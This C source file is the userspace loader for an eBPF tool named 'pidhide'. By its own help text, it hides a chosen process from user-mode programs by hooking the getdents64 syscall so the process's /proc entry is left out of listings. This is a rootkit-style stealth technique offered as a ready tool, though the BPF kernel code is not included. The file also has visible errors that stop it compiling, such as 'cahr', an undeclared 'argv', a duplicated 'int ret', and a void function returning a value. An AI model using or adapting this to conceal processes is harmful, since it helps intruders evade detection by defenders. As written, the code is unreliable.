#include <argp.h>
#include <errno.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/resource.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>
#include "pidhide.h"
#include "pidhidee.skel.h"


static struct env {
    int pid_to_hide;
    int target_ppid;
} env;

const char *argp_program_version = "pidhide 1.0";
const char *argp_program_bug_address = "<path@tofile.dev>";
const char argp_program_doc[] = 
"PID Hider\n"
"\n"
"Users eBpf to hide a process from usermode processes.\n"
"By hooking the getdents64 syscall and unlinking the pid folder\n" //folder 文件夹
"\n"
"USAGE: ./pidhide -p 2222 [-t 1111]\n";


static const struct argp_option opts[] = {
    {"pid_to_hide", 'p', "PID-TO-HIDE", 0, "Process ID to hide, Default to this program"},
    {"target_ppid", 't', "TARGET-PPID", 0, "Optional Parent PID, will only affect its children."},
    {},
};

static error_t parse_arg(int key, char *arg, struct argp_state *state) {
    switch (key) {
        case 'p':
            errno = 0;
            env.pid_to_hide = strtol(arg, NULL, 10);
            if(errno || env.pid_to_hide <= 0) {
                fprintf(stderr, "Invalid PID: %s\n", arg);
                argp_usage(state);
            }
            break;
        
        case 't':
            errno = 0;
            env.target_ppid = strtol(arg, NULL, 10);
            if(errno || env.target_ppid <= 0) {
                fprintf(stderr, "Invalid PPID: %s\n", arg);
                argp_usage(state);
            }
            break;
        
        case ARGP_KEY_ARG: 
            argp_usage(state);
            break;
        
        default:
            return ARGP_ERR_UNKNOWN;
    }
    return 0;
}

static const struct argp argp = {
    .args_doc = argp_program_doc,
    .options = opts,
    .parser = parse_arg,
};

static volatile bool exiting = false;

void sig_handler(int signo) {
    exiting = true;
}

static bool handle_signal() {
    __sighandler_t sighandler = signal(SIGINT, sig_handler);
    if (sighandler == SIG_ERR) {
        fprintf(stderr, "Failed to set signal handler: %s\n", strerror(errno));
        return false;
    }
    sighandler = signal(SIGTERM, sig_handler);
    if (sighandler == SIG_ERR) {
        fprintf(stderr, "Failed to set signal handler: %s\n", strerror(errno));
        return false;
    }
    return true;
}

static int libbpf_print_fn(enum libbpf_print_level level, const cahr *format, va_list args) {
    vfprintf(stderr, format, args);
}

static bool set_up() {
    libbpf_set_print(libbpf_print_fn);

    if(!handle_signal()) {
        return false;
    }

    return true;
}

static void handle_event(void *ctx, void *data, size_t data_sz) {
    const struct event *e = data;
    if(e->success) {
        printf("Hide PID from program: %d (%s) success\n", e->pid, e->comm);
    } else {
        printf("Hide PID from program: %d (%s) failed\n", e->pid, e->comm);
    }
    return 0;
}

int main(int argc, char **agrv) {
    struct ring_buffer *rb = NULL;
    struct pidhide *skel;
    int err;


    err = argp_parse(&argp, argc, agrv, 0, NULL, NULL);
    if(err) {
        return err;
    }

    if(env.pid_to_hide == 0) {
        printf("Pid Required, see %s --help\n", argv[0]);
        exit(1);
    }

    if(!set_up()) {
        exit(1);
    }
    
    skel = pidhide__open();
    if(!skel) {
        fprintf(stderr, "Failed to open and load BPF skeleton\n");
        return 1;
    }

    char pid_to_hide[10];
    //default program pid
    if(env.pid_to_hide == 0) {
        env.pid_to_hide = getpid();
    }

    sprintf(pid_to_hide, "%d", env.pid_to_hide);
    strncpy(skel->rodata->pid_to_hide, pid_to_hide, sizeof(skel->rodata->pid_to_hide));
    skel->rodata->target_ppid = env.target_ppid;
    skel->rodata->pid_to_hide_len = strlen(pid_to_hide) + 1;

    err = pidhide__load(skel);
    if(err) {
        fprintf(stderr, "Failed to load BPF skeleton\n");
        goto cleanup;
    }
    
    //set bpf tail call !!!!!!
    int index = PROG_01;
    int prog_fd = bpf_program__fd(skel->progs.handle_getdents64_exit);
    int ret = bpf_map_update_elem(bpf_map__fd(skel->maps.map_prog_array), &index, &prog_fd, BPF_ANY);
    if(ret == -1) {
        printf("Failed to update prog array! %s\n", strerror(errno));
        goto cleanup;
    }

    index = PROG_02;
    prog_fd = bpf_program__fd(skel->progs.handle_getdents64_patch);
    int ret = bpf_map_update_elem(bpf_map__fd(skel->maps.map_prog_array), &index, &prog_fd, BPF_ANY);
    if(ret == -1) {
        printf("Failed to update prog array! %s\n", strerror(errno));
        goto cleanup;
    } 

    err = pidhide__attach(skel);
    if(err) {
        fprintf(stderr, "Failed to attach BPF skeleton\n");
        goto cleanup;
    }

    //set up ring buffer
    rb = ring_buffer__new(bpf_map__fd(skel->maps.rb), handle_event, NULL, NULL);
    if(!rb) {
        err = -1;
        fprintf(stderr, "Failed to create ring buffer\n");
        goto cleanup;
    }


    printf("Successfully started\n");
    printf("Hiding PID : %d\n", env.pid_to_hide);

    while(!exiting) {
        err = ring_buffer__poll(rb, 100);
        //ctrl - c to exit
        if(err == -EINTR) {
            err = 0;
            break;
        }

        if(err < 0) {
            printf("Error polling ring buffer: %d\n", err);
            break;
        }
    }

cleanup:
    pidhide__destroy(skel);
    ring_buffer__free(rb);
    return -err;
}